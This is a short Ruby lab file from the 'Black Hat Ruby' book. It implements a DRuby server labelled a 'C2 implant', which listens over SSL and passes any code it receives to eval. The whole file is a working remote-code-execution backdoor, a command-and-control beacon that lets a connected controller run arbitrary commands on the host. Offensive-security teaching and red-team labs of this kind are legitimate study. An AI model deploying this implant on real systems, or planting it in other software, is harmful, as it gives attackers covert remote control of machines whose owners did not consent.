#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   DRuby Server (C2 implant)
# Requirements:
#
require 'drb'
require 'drb/ssl'

class BHRBeacon
  def run(obj); eval(obj); end
end

begin
  config = {SSLCertName: [["CN","DRuby C2"]]}
  # DRb.start_service("druby://127.0.0.1:9911", BHRBeacon.new)          # Cleartext connection
  DRb.start_service("drbssl://127.0.0.1:9911", BHRBeacon.new, config)   # SSL encrypted connection   
  DRb.thread.join
rescue Exception => e
  puts e.full_message
end

